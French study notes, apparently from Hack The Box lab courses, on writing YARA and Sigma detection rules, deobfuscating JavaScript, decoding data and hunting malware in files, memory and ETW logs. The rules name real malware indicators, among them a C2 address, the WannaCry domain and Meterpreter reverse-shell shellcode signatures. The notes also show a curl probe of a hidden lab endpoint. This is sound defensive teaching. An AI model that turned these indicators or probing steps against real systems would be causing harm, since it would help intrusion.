Pour des règles plus avancées, nous pouvons utiliser **yarGen**, un outil qui automatise la création de règles YARA en extrayant des chaînes uniques et des motifs d'un échantillon donné.

##### **Étapes pour Générer des Règles avec yarGen :**

1. **Préparer le Répertoire de Test** :
   Créez un répertoire et copiez l’échantillon de malware (par exemple, `shell.exe`) dedans :

   ```bash
   mkdir /home/htb-student/Samples/MalwareAnalysis/Test
   cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/
   ```

2. **Exécuter yarGen** :
   Allez dans le répertoire de yarGen et exécutez la commande suivante :

   ```bash
   cd /home/htb-student/yarGen-0.23.4
   sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/
   ```

   Cela génère un fichier de règles YARA (`yargen_rules.yar`) contenant les motifs uniques de `shell.exe`.

##### **Exemple de Règle Générée** :

Voici un exemple de règle YARA générée par yarGen :

```yara
rule _home_htb_student_Samples_MalwareAnalysis_Test_shell {
   meta:
      description = "Test - fichier shell.exe"
      author = "yarGen Rule Generator"
      date = "2023-08-02"
      hash1 = "bd841e796feed0088ae670284ab991f212cf709f2391310a85443b2ed1312bda"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $s2 = "http://ms-windows-update.com/svchost.exe" fullword ascii
      $s3 = "45.33.32.156" fullword ascii
      $s4 = "[-] Error code is : %lu" fullword ascii
      $s5 = "Connection sent to C2" fullword ascii
      $s6 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and 3 of ($s*)
}
```

#### **Utilisation de la Règle pour la Détection** :

Pour utiliser cette règle pour la détection, exécutez la commande suivante :

```bash
yara /home/htb-student/yarGen-0.23.4/yargen_rules.yar /home/htb-student/Samples/MalwareAnalysis/
```

La sortie devrait confirmer la détection si `shell.exe` est présent dans le répertoire spécifié.

---

### **Règles Sigma**

Sigma est un format de règle pour la détection des menaces de sécurité dans les systèmes SIEM. Les règles Sigma standardisent la détection à travers différentes plateformes, permettant ainsi de détecter des motifs ou événements malveillants en analysant les journaux.

#### **Exemple de Règle Sigma de Base**

Voici un exemple de règle Sigma pour détecter un fichier nommé **svchost.exe** déposé dans le dossier **Temp** :

```yaml
title: Dépôt de fichier suspect dans le dossier Temp de l'utilisateur
status: experimental
description: Détecte l'activité suspecte où un fichier est déposé dans le dossier temp

logsource:
    category: process_creation
detection:
    selection:
        TargetFilename:
            - '*\\AppData\\Local\\Temp\\svchost.exe'
    condition: selection
    level: high

falsepositives:
    - Dépôts légitimes de fichiers exe dans le dossier temp
```

#### **Exemple de Règle de Détection avec les Logs Sysmon**

Sysmon fournit des journaux détaillés sur les processus, fichiers et connexions réseau, qui peuvent être utilisés pour créer des règles Sigma plus complexes. Exemple de règle pour la création d'un processus en réponse au comportement de `shell.exe` :

**Règle Sysmon - Création de Processus** :

```yaml
title: Création de processus suspecte pour modification de registre
logsource:
   category: process_creation
   product: windows
detection:
   selection:
      Image: 'C:\\Windows\\System32\\cmd.exe'
      CommandLine: '*ping 127.0.0.1 -n 5*'
   condition: selection
level: high
description: Détecte la création de processus avec des arguments de ligne de commande liés à des commandes de délai ou de pause
```

**Règle Sysmon - Connexion Réseau** :

```yaml
title: Connexion réseau suspecte à une IP de serveur C2
logsource:
   category: network_connection
   product: windows
detection:
   selection:
      DestinationIp: '45.33.32.156'
      DestinationPort: 31337
   condition: selection
level: high
description: Détecte les connexions réseau vers une IP de serveur C2 connue
```

---

### **Ressources**

#### **YARA** :

* Documentation : [YARA Documentation](https://virustotal.github.io/yara/)
* Règles communautaires : [InQuest’s Awesome YARA](https://github.com/InQuest/awesome-yara)

#### **Sigma** :

* Documentation : [Sigma Specification](https://github.com/Neo23x0/sigma)
* Règles communautaires : [SigmaHQ Rules](https://github.com/SigmaHQ/sigma)

#### **Références et Ressources Complémentaires** :

* Documentation YARA : [YARA Rules](https://virustotal.github.io/yara/)
* Documentation Sigma : [Sigma Rules](https://github.com/Neo23x0/sigma)
* DFIR Report : [YARA et Sigma Rules par DFIR](https://www.dfirreport.com/)

---

```

## **JavaScript Deobfuscation**

## Outils

```jsx

---

## 🛠️ Outils Utilisés

| **Outil**                                                                                                | **Cas d’usage**                                                                                                        |
| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| [https://jsconsole.com](https://jsconsole.com)                                                           | Tester du code JavaScript en ligne, exécuter rapidement des scripts dans un environnement de console.                  |
| [https://javascript-minifier.com/](https://javascript-minifier.com/)                                     | Minification du code : transforme le code JavaScript en une seule ligne compacte pour le rendre plus difficile à lire. |
| [http://beautifytools.com/javascript-obfuscator.php](http://beautifytools.com/javascript-obfuscator.php) | Obfuscation simple ou compression du code pour masquer la logique métier.                                              |
| [https://obfuscator.io/](https://obfuscator.io/)                                                         | Obfuscation avancée avec plusieurs niveaux de protection et options de configuration.                                  |
| [https://beautifier.io/](https://beautifier.io/)                                                         | Réindente et reformate du code JavaScript compacté ou difficile à lire.                                                |
| [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html)                               | Déobfuscation : permet de retrouver une version lisible du code obfusqué ou packé (par exemple via P.A.C.K.E.R).       |

---

```

## **Code Analysis**

```jsx

---

## 🔍 Analyse de la fonction `generateSerial` dans *secret.js*

La fonction `generateSerial`, présente dans le fichier JavaScript `secret.js`, effectue une requête POST vers l’URL `/serial.php` via un objet `XMLHttpRequest`, sans envoyer de données ni traiter de réponse. Voici une décomposition complète :

---

### 🧠 Vue d’ensemble du code

```javascript
'use strict';
function generateSerial() {
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
```

---

### 🔧 Analyse du code étape par étape

#### 1. **Initialisation des variables**

* `xhr` : Crée un objet `XMLHttpRequest`, utilisé pour effectuer des requêtes HTTP en JavaScript.
* `url` : Contient l’URL cible `/serial.php`, située sur le même domaine (car aucune URL complète n’est précisée).

#### 2. **Logique de la fonction**

* `xhr.open("POST", url, true)` : Prépare une requête HTTP de type POST vers `/serial.php`, en mode **asynchrone** (paramètre `true`).
* `xhr.send(null)` : Envoie la requête sans données dans le corps — c’est donc une **requête POST vide**.

#### 3. **Objectif et usage possible**

* Cette fonction semble destinée à déclencher un processus côté serveur via `/serial.php`, probablement pour **générer ou vérifier un numéro de série**.
* L’absence de gestion de réponse (`xhr.onreadystatechange`, `xhr.responseText`, etc.) et d’interaction avec des éléments HTML suggère que :

  * La fonction est **incomplète** ou en cours de développement.
  * Ou elle est **prévue pour être appelée** via un événement, comme un clic sur un bouton « Générer un numéro de série ».
* Elle ne semble pas activement utilisée dans l’interface actuelle.

---

### ⚠️ Implications en matière de sécurité

Cette fonction pourrait révéler des comportements ou fonctionnalités cachées sur le serveur :

* Le script appelle un **endpoint serveur peu visible** (/serial.php), ce qui peut indiquer un **comportement non documenté ou expérimental**.
* Il pourrait exister des failles potentielles telles que :

  * **Absence de vérification des autorisations**
  * **Manque de validation des requêtes**
  * **Réponses contenant des informations sensibles** (ex : messages d’erreur, traces de debug)

---

### ✅ Étapes suivantes pour l’analyse

1. **Reproduire la requête**
   Utiliser `curl`, Postman ou l’onglet Réseau du navigateur pour envoyer une requête POST vide à `/serial.php`.

   ```bash
   curl -X POST https://example.com/serial.php
   ```

2. **Analyser la réponse du serveur**

   * Regarder le **code HTTP** de retour (200, 403, 500, etc.).
   * Examiner les éventuels **contenus retournés** : numéro de série, erreurs, indices sur la logique métier.

3. **Évaluer les vulnérabilités potentielles**

   * Vérifier si l’accès à `/serial.php` est **protégé** (authentification, droits).
   * Tester différentes variantes de requêtes (POST avec données, GET).
   * Identifier si le serveur **expose des informations sensibles** ou un comportement exploitable.

---

```

## **HTTP Requests**

```jsx

---

## 🌐 Bases de cURL

### ✅ Requête GET simple

Pour récupérer le contenu d'une page web, il suffit de spécifier l’URL avec la commande `curl` :

```bash
curl http://ADRESSE_DU_SERVEUR:PORT/
```

#### 📄 Exemple de sortie :

```html
</html>
<!DOCTYPE html>
<head>
    <title>Secret Serial Generator</title>
    ...
    <h1>Secret Serial Generator</h1>
    <p>This page generates secret serials!</p>
</div>
</body>
</html>
```

Ce résultat correspond au **code source HTML** visible dans l’inspecteur du navigateur.

---

### 📬 Requête POST simple

Pour envoyer une requête POST (comme le fait la fonction `generateSerial`), on utilise l’option `-X POST` :

```bash
curl -s http://ADRESSE_DU_SERVEUR:PORT/ -X POST
```

* `-s` active le **mode silencieux**, qui masque les messages de progression ou d’erreur pour n’afficher que le contenu de la réponse.

---

### 📤 Requête POST avec des données

En général, une requête POST inclut des **données** dans le corps de la requête. Pour cela, on utilise l’option `-d` :

```bash
curl -s http://ADRESSE_DU_SERVEUR:PORT/ -X POST -d "param1=exemple"
```

---

## 🔎 Étapes suivantes

Dans la suite de l’analyse, nous allons simuler **exactement** la requête POST vers `/serial.php` comme définie dans la fonction `generateSerial`.
Même si celle-ci ne transmet pas de données, on peut utiliser `curl` pour explorer les **réponses potentielles du serveur**, et ainsi mieux comprendre le fonctionnement de cet endpoint.

```

## **Decoding**

```jsx

---

## 🔐 Techniques d'encodage courantes

L’encodage est souvent utilisé pour dissimuler ou transformer des données dans un format différent. Voici les méthodes d'encodage les plus fréquemment rencontrées lors d’analyses de sécurité ou de décodage d'informations cachées.

---

### 🧾 Encodage Base64

* **But** : Convertit des données en un format alphanumérique lisible, avec les caractères `+` et `/`, et un ou plusieurs `=` comme **remplissage** pour que la longueur soit un multiple de 4.
* **Comment le repérer** : Composé de lettres majuscules/minuscules, de chiffres, souvent avec `/`, `+`, et se terminant par `=`.

#### ➕ Encodage :

```bash
echo "https://www.hackthebox.eu/" | base64
```

#### ➖ Décodage :

```bash
echo "aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K" | base64 -d
```

#### 🎯 Exemple :

```bash
echo "ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=" | base64 -d
```

Ce code se décode en :
**"do the exercise, don't copy and paste ;)"**

---

### 🔢 Encodage Hexadécimal (Hex)

* **But** : Représente chaque caractère par sa valeur ASCII en hexadécimal.
* **Comment le repérer** : Ne contient que des caractères de `0-9` et `a-f`.

#### ➕ Encodage :

```bash
echo "https://www.hackthebox.eu/" | xxd -p
```

#### ➖ Décodage :

```bash
echo "68747470733a2f2f7777772e6861636b746865626f782e65752f0a" | xxd -p -r
```

---

### 🔁 Chiffrement César / ROT13

* **But** : Décale chaque lettre de l’alphabet d’un nombre fixe (par exemple, ROT13 = décalage de 13 positions).
* **Comment le repérer** : Les caractères restent lisibles, seul leur ordre change. Le texte garde une **structure alphabétique reconnaissable**.

#### 🔃 Encodage / Décodage avec ROT13 (réversible) :

```bash
echo "https://www.hackthebox.eu/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

#### 🔄 Pour décoder (même commande) :

```bash
echo "uggcf://jjj.unpxgurobk.rh/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

### 🕵️ Identifier le type d'encodage

Pour des chaînes ambiguës, des outils en ligne comme **Cipher Identifier** (par exemple : dcode.fr ou CyberChef) peuvent aider à détecter le type d'encodage automatiquement.

---

### 🔐 Encodage avancé vs chiffrement

* **Encodage** : Change le format des données pour des raisons techniques (lisibilité, compatibilité) — pas sécurisé.
* **Chiffrement** : Transforme les données de manière **incompréhensible sans clé**, dans un but de **confidentialité**.

> ❗ En analyse de malware, tests de sécurité ou ingénierie inverse, savoir reconnaître et décoder ces formats permet d’identifier des données dissimulées ou des comportements suspects.

---

```

## **YARA & Sigma for SOC ANalysts**

## Y**ARA and YARA Rules**

```jsx
### YARA et les Règles YARA

YARA est un outil puissant de correspondance de motifs qui permet d'identifier des fichiers en fonction de motifs et de règles spécifiques. Ces règles permettent aux analystes SOC et aux équipes de criminalistique de détecter, classifier et enquêter sur des fichiers suspects et des échantillons de malwares. Les règles YARA analysent le contenu textuel ou binaire des fichiers et peuvent également être appliquées à la mémoire, contribuant ainsi à la détection de malwares et à la chasse proactive aux menaces.

---

### Utilisations de YARA

* **Détection de Malware** : Permet d'identifier les malwares en se basant sur des motifs ou comportements uniques.
* **Classification de Fichiers** : Aide à classer les fichiers par format, version, métadonnées, etc.
* **Détection des IOCs** : Recherche de l'indicateur de compromission (IOC) dans les fichiers, comme les clés de registre ou les noms de fichiers.
* **Chasse aux Menaces** : Recherche proactive de menaces dans l'environnement.
* **Réponse aux Incidents** : Recherche rapide d'artéfacts en réponse aux incidents de sécurité.
* **Règles Personnalisées pour Menaces Ciblées** : Création de règles sur mesure pour répondre à des besoins organisationnels spécifiques.

---

### Comment YARA Fonctionne

* **Jeu de Règles** : Les règles définissent des motifs ou des comportements à rechercher.
* **Jeu de Fichiers** : Ensemble de fichiers ou de captures mémoire à analyser.
* **Moteur YARA** : Compare le contenu des fichiers octet par octet avec les règles définies.
* **Sortie de Détection** : Si des motifs sont trouvés, YARA marque le fichier comme détecté.

---

### Structure d'une Règle YARA

1. **Structure de Base** :

```yara
rule NomDeLaRègle {
    meta:
        author = "Nom de l'Auteur"
        description = "Description de la règle"
    strings:
        $string1 = "exemple_texte"
        $string2 = { 4A 2D 1C }
    condition:
        all of them
}
```

2. **Composants d'une Règle YARA** :

* **En-tête de Règle** : Commence par le mot-clé `rule`, suivi du nom de la règle.
* **Section Meta** : Contient des métadonnées telles que l’auteur, la description, la version et les références.
* **Section Strings** : Définit des chaînes de texte, des motifs hexadécimaux ou des expressions régulières à rechercher.
* **Section Condition** : Spécifie les conditions sous lesquelles la règle est déclenchée.

3. **Exemple de Règle – Détection des Chaînes de WannaCry** :

```yara
rule Ransomware_WannaCry {
    meta:
        author = "Nom de l'Analyste"
        description = "Détecte les chaînes spécifiques de WannaCry"
    strings:
        $wannacry1 = "tasksche.exe" fullword ascii
        $wannacry2 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry3 = "mssecsvc.exe" fullword ascii
    condition:
        all of them
}
```

4. **Conditions et Opérateurs Logiques** :

* **all of them** : Toutes les chaînes spécifiées doivent correspondre.
* **any of them** : N'importe laquelle des chaînes spécifiées peut correspondre.
* **Condition de Taille de Fichier** : Vérifie que la taille du fichier respecte certains critères :

```yara
condition:
    filesize < 100KB and uint16(0) == 0x5A4D
```

* **uint16(0) == 0x5A4D** : Vérifie si les deux premiers octets correspondent à 0x5A4D (indiquant un en-tête MZ pour les exécutables).

---

### Fonctionnalités Avancées des Règles YARA

* **Opérateurs Logiques** : Permet de combiner les conditions avec `and`, `or`, `not`.
* **Modules Externes** : Étend la fonctionnalité des règles pour répondre à des besoins spécifiques.
* **Personnalisabilité** : Permet d'adapter les règles en fonction de menaces ou d'indicateurs spécifiques.

---

```

## **Developing YARA Rules**

```jsx

---

## 🧠 Introduction aux Règles YARA

YARA est un outil puissant permettant de détecter des fichiers malveillants en analysant leur structure et leur contenu. Ce guide présente des exemples concrets de développement de règles YARA pour détecter des exécutables packagés, des malwares spécifiques et d'autres comportements suspects.

---

### 1. 📝 **Règle YARA de Base pour les Executables Packagés UPX**

**Analyse de chaînes :**

```bash
Kailez@htb[/htb]$ strings svchost.exe
```

#### Exemple de règle YARA pour détecter des exécutables packagés avec UPX :

```yaml
rule UPX_packed_executable {
    meta:
        description = "Détecte les exécutables packagés avec UPX"
    strings:
        $string_1 = "UPX0"
        $string_2 = "UPX1"
        $string_3 = "UPX2"
    condition:
        all of them
}
```

**Explication :**

* La règle utilise des chaînes typiques d'un fichier packagé avec UPX (comme `UPX0`, `UPX1`, et `UPX2`) pour identifier les exécutables suspectés d'être compressés par UPX.
* La condition `all of them` vérifie que toutes les chaînes sont présentes dans le fichier.

---

### 2. 🔧 **Génération d’une Règle YARA avec `yarGen`**

**Commandes :**

```bash
Kailez@htb[/htb]$ python3 yarGen.py -m /home/htb-student/temp -o htb_sample.yar
```

**Exécution :**

```bash
Kailez@htb[/htb]$ cat htb_sample.yar
```

Cela génère automatiquement une règle YARA en utilisant les caractéristiques des fichiers présents dans le répertoire `/home/htb-student/temp`.

---

### 3. 🧩 **Exemples de Développement Manuel de Règles YARA**

#### Exemple 1 : **Détection du RAT ZoxPNG utilisé par APT17**

**Analyse de chaînes :**

```bash
Kailez@htb[/htb]$ strings legit.exe
```

**Calcul du `imphash` :**

```bash
Kailez@htb[/htb]$ python3 imphash_calc.py /home/htb-student/Samples/YARASigma/legit.exe
```

#### Règle YARA pour APT17 :

```yaml
import "pe"

rule APT17_Malware_Oct17_Gen {
    meta:
        description = "Détecte le malware APT17"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Florian Roth (Nextron Systems)"
        reference = "https://goo.gl/puVc9q"
        date = "2017-10-03"
        hash1 = "0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2"
    strings:
        $x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)" fullword ascii
        $x2 = "http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM" ascii
        $s1 = "hWritePipe2 Error:%d" fullword ascii
        $s2 = "Not Support This Function!" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 200KB and (
            pe.imphash() == "414bbd566b700ea021cfae3ad8f4d9b9" or
            1 of ($x*) or
            6 of them
        )
}
```

**Explication :**

* Utilisation d'un `imphash` pour identifier les fichiers APT17.
* La condition de détection vérifie la signature du fichier, sa taille, et certaines chaînes spécifiques, ainsi que l'empreinte de son fichier PE (`pe.imphash()`).

---

#### Exemple 2 : **Détection de Neuron Utilisé par Turla**

**Reverse Engineering avec `monodis` :**

```bash
Kailez@htb[/htb]$ monodis --output=code Microsoft.Exchange.Service.exe
Kailez@htb[/htb]$ cat code
```

#### Règle YARA pour Neuron :

```yaml
rule neuron_functions_classes_and_vars {
    meta:
        description = "Règle de détection pour Neuron basé sur les fonctions .NET et les noms de classes"
        author = "NCSC UK"
        reference = "https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB"
        hash = "d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29"
    strings:
        $class1 = "StorageUtils" ascii
        $class2 = "WebServer" ascii
        $func1 = "AddConfigAsString" ascii
        $func2 = "EncryptScript" ascii
        $dotnetMagic = "BSJB" ascii
    condition:
        uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and $dotnetMagic and 6 of them
}
```

**Explication :**

* Cette règle cherche des chaînes spécifiques à des fonctions et classes présentes dans l'exécution de Neuron.
* La condition vérifie la signature du fichier et des chaînes associées aux fonctions et classes dans le fichier .NET.

---

#### Exemple 3 : **Détection de Stonedrill Utilisé dans Shamoon 2.0**

**Analyse d'entropie :**

```bash
Kailez@htb[/htb]$ python3 entropy_pe_section.py -f /home/htb-student/Samples/YARASigma/sham2.exe
```

#### Règle YARA pour Stonedrill :

```yaml
import "pe"
import "math"

rule susp_file_enumerator_with_encrypted_resource_101 {
    meta:
        copyright = "Kaspersky Lab"
        description = "Détection générique pour les échantillons énumérant les fichiers avec une ressource cryptée appelée 101"
        reference = "https://securelist.com/from-shamoon-to-stonedrill/77725/"
        hash = "2cd0a5f1e9bcce6807e57ec8477d222a"
    strings:
        $mz = "This program cannot be run in DOS mode."
        $a1 = "FindFirstFile" ascii wide nocase
        $a3 = "FindResource" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and all of them and filesize < 700000 and
        pe.number_of_sections > 4 and pe.number_of_signatures == 0 and
        pe.number_of_resources > 1 and pe.number_of_resources < 15 and
        for any i in (0..pe.number_of_resources - 1):
        ( (math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and
          pe.resources[i].id == 101 and pe.resources[i].length > 20000 and
          pe.resources[i].language == 0 and
          not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
        )
}
```

**Explication :**

* Recherche de fichiers ayant une ressource cryptée spécifique (id 101).
* Utilisation de l'entropie pour identifier des ressources compressées ou cryptées et filtrage par taille et langue des ressources.

---

### 📚 **Ressources pour le Développement de Règles YARA**

* **Documentation officielle de YARA** : [YARA Documentation](https://yara.readthedocs.io/)
* **Guide Kaspersky sur le développement de règles YARA** : [Kaspersky Guide](https://securelist.com/)

---

```

## **Hunting Evil with YARA (Windows Edition)**

```jsx
### Vue d'Ensemble

Utiliser **YARA** sur des systèmes Windows est efficace pour identifier les menaces sur le disque et en mémoire.

#### Étapes Clés :

* **Se connecter au système cible** :

  * Lancez le système cible.
  * Utilisez RDP pour vous connecter avec les identifiants fournis.

---

### Recherche de fichiers exécutables malveillants sur le disque

* **Exemple de fichier** : dharma\_sample.exe situé dans C:\Samples\YARASigma.
* **Analyse hexadécimale** : Utilisation de HxD pour inspecter des chaînes telles que `C:\crysis\Release\PDB\payload.pdb` et `sssssbsss`.
* **Exemple de règle YARA** : Détection de motifs dans des exécutables malveillants.

#### Règle YARA Exemple : Ransomware Dharma

```yara
rule ransomware_dharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "Détecte les chaînes du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $string_pdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $string_ssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
```

#### Commande pour exécuter un scan YARA sur des fichiers

```bash
yara64.exe -s C:\Rules\yara\dharma_ransomware.yar C:\Samples\YARASigma\ -r 2>null
```

* **Fichiers détectés** : pdf\_reader.exe, microsoft.com, check\_updates.exe, KB5027505.exe.

---

### Recherche de malwares dans les processus en cours

* **Processus cible** : Exemple avec injection de shellcode Meterpreter.
* **Règle YARA pour Metasploit Meterpreter** :

```yara
rule meterpreter_reverse_tcp_shellcode {
    meta:
        author = "FDD @ Cuckoo sandbox"
        description = "Shellcode TCP inverse de Meterpreter pour Metasploit"

    strings:
        $s1 = { fce8 8?00 0000 60 }
        $s2 = { 648b ??30 }
        $s3 = { 4c77 2607 }
        $s4 = "ws2_"
        $s5 = { 2980 6b00 }
        $s6 = { ea0f dfe0 }
        $s7 = { 99a5 7461 }

    condition: 5 of them
}
```

#### Scanning des processus actifs

```powershell
Get-Process | ForEach-Object { 
    "Scanning with Yara for meterpreter shellcode on PID "+$_.id; 
    & "yara64.exe" "C:\Rules\yara\meterpreter_shellcode.yar" $_.id 
}
```

* **Résultat** : Détecte le shellcode dans le processus PID 9084.

---

### Recherche de comportements malveillants dans les données ETW avec YARA

#### Principaux fournisseurs ETW (Event Tracing for Windows)

* **Microsoft-Windows-Kernel-Process** : Suit les activités des processus.
* **Microsoft-Windows-Kernel-File** : Surveille les opérations de fichiers.
* **Microsoft-Windows-DNS-Client** : Journalise l'activité DNS (utile pour la détection de C2).

#### Intégration de YARA avec SilkETW

* **Exemple de fournisseur PowerShell ETW** :

```powershell
.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etw_ps_logs.json -l verbose -y C:\Rules\yara -yo Matches
```

* **Règle YARA pour les chaînes PowerShell** :

```yara
rule powershell_hello_world_yara {
    strings:
        $s0 = "Write-Host" ascii wide nocase
        $s1 = "Hello" ascii wide nocase
        $s2 = "from" ascii wide nocase
        $s3 = "PowerShell" ascii wide nocase
    condition: 3 of ($s*)
}
```

* **Fournisseur DNS Client** :

```powershell
.\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etw_dns_logs.json -l verbose -y C:\Rules\yara -yo Matches
```

* **Règle YARA pour un domaine de WannaCry** :

```yara
rule dns_wannacry_domain {
    strings:
        $s1 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii wide nocase
    condition: $s1
}
```

---

Ces techniques permettent d'effectuer des recherches approfondies à la fois sur le disque et en mémoire, ainsi que dans les processus en cours et les événements système pour identifier les comportements malveillants. L'utilisation de YARA et d'outils comme SilkETW et Volatility permet d'améliorer l'efficacité des investigations de sécurité en exploitant des sources de données variées.

```

## **Hunting Evil with YARA (Linux Edition)**

```jsx

Lorsqu'un accès direct à un système est restreint, les captures de mémoire peuvent toujours nous permettre d'enquêter sur des menaces potentielles. En utilisant **YARA** sur ces captures de mémoire, les analystes en sécurité peuvent rechercher des indicateurs de compromission, même lorsque le système lui-même reste inaccessible.

---

### Processus Clé :

1. **Créer des règles YARA** : Développez des règles ciblant les caractéristiques des malwares basés sur la mémoire ou des comportements suspects.
2. **Compiler les règles** : Utilisez `yarac` pour compiler les règles YARA au format binaire `.yrc` (optionnel pour de meilleures performances).
3. **Capturer l'image mémoire** : Utilisez des outils tels que **DumpIt**, **MemDump**, **Belkasoft RAM Capturer**, **Magnet RAM Capture**, **FTK Imager**, ou **LiME** (Linux Memory Extractor).
4. **Analyser l'image mémoire avec YARA** : Exécutez **YARA** sur l'image mémoire pour détecter les correspondances.

---

### Exemple de Scan de Mémoire avec YARA

**Image mémoire** : `compromised_system.raw` située dans `/home/htb-student/MemoryDumps`.
**Fichier de règle YARA** : `wannacry_artifacts_memory.yar` situé dans `/home/htb-student/Rules/yara`.

```bash
yara /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar /home/htb-student/MemoryDumps/compromised_system.raw --print-strings
```

**Sortie Exemple :**

```
Détection de motifs liés au ransomware WannaCry, comme `tasksche.exe` et autres artefacts connus.
```

---

### Intégration de YARA avec Volatility pour l'Analyse de Mémoire

**Volatility Framework**
**Volatility** est un outil puissant pour analyser des images mémoire sur plusieurs plateformes OS. En utilisant **YARA** dans **Volatility** via le plugin **yarascan**, les analystes peuvent rechercher des indicateurs de malwares spécifiques dans la mémoire.

#### Exemple - Recherche d'un Modèle Unique

Rechercher une URI codée en dur sans fichier YARA :

```bash
vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
```

**Sortie** :
Trouve des occurrences de cette URI dans l'image mémoire.

#### Exemple - Scan avec Plusieurs Règles

Appliquer un ensemble de règles YARA avec l'option `-y` de **Volatility** :

```bash
vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar
```

**Sortie Exemple** :
Identifie des artefacts spécifiques de **WannaCry** dans l'image mémoire.

---

### Exemple de Règle YARA pour WannaCry

```yara
rule Ransomware_WannaCry {
    meta:
        author = "Madhukar Raina"
        version = "1.1"
        description = "Détecte les chaînes de caractères liées au ransomware WannaCry"
        reference = "https://www.virustotal.com"

    strings:
        $wannacry_payload_str1 = "tasksche.exe" fullword ascii
        $wannacry_payload_str2 = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry_payload_str3 = "mssecsvc.exe" fullword ascii
        $wannacry_payload_str4 = "diskpart.exe" fullword ascii
        $wannacry_payload_str5 = "lhdfrgui.exe" fullword ascii

    condition: 3 of them
}
```

**Sortie Exemple** :
Identifie des artefacts spécifiques de **WannaCry** dans l'image mémoire.

---

```

## **Hunting Evil with YARA (Web Edition)**

```jsx

**Unpac.Me** offre une solution robuste pour le désempaquetage des malwares et permet aux analystes en sécurité d'exécuter des règles YARA sur une vaste base de données de soumissions de malwares. Cette plateforme donne accès à un ensemble de données sur les malwares de qualité commerciale, ce qui en fait une ressource précieuse pour les analystes SOC et les chercheurs en malwares.

---

### Tester des Règles YARA avec Unpac.Me

Prenons l'exemple de la règle YARA suivante, ciblant le ransomware Dharma :

```yara
rule ransomware_dharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "Détecte les chaînes de caractères du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $string_pdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $string_ssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
```

### Étapes pour Lancer une Recherche YARA sur Unpac.Me

1. **Inscription** : Inscrivez-vous pour un compte gratuit sur **Unpac.Me**.
2. **Démarrer une Nouvelle Recherche** :

   * Allez dans la section **Yara Hunt** et sélectionnez **Nouvelle Recherche**.
   * Copiez et collez la règle YARA dans le champ de saisie de la règle.
3. **Valider et Scanner** :

   * Cliquez sur **Valider** pour vous assurer que la règle est correcte, puis cliquez sur **Scanner**.
4. **Consulter les Résultats** : Après le scan, **Unpac.Me** affiche les résultats, montrant les correspondances en quelques minutes.

```

## **Sigma and Sigma Rules**

```jsx

Sigma est un format de signature générique et standardisé qui permet aux analystes SOC de créer, partager et utiliser des règles de détection pour l'analyse des journaux à travers différentes plateformes. Écrites en YAML, les règles Sigma offrent une portabilité inter-plateformes, permettant aux analystes d'écrire une règle une fois et de la déployer sur divers systèmes SIEM et EDR.

---

### Cas d'Utilisation Principaux des Règles Sigma

* **Analyse Universelle des Journaux** : Rédiger des règles de détection une seule fois et les convertir en formats compatibles avec divers SIEM.
* **Partage de Règles Communautaires** : Accéder à une bibliothèque croissante de règles Sigma partagées par la communauté et y contribuer.
* **Réponse aux Incidents** : Rechercher efficacement des indicateurs dans les journaux lors d’incidents.
* **Chasse Proactive aux Menaces** : Utiliser les règles Sigma pour détecter des anomalies ou des menaces dans les ensembles de données.
* **Intégration avec des Outils d’Automatisation** : Automatiser les réponses en utilisant les règles Sigma avec des plateformes SOAR.
* **Personnalisation** : Adapter les règles Sigma aux besoins spécifiques de l'environnement.
* **Analyse des Écarts** : Effectuer une analyse des écarts en alignant les règles personnalisées avec les standards de la communauté.

---

### Comment Sigma Fonctionne

Sigma exprime les modèles de détection dans un format structuré, avec des règles écrites en YAML. Une règle Sigma comprend les éléments suivants :

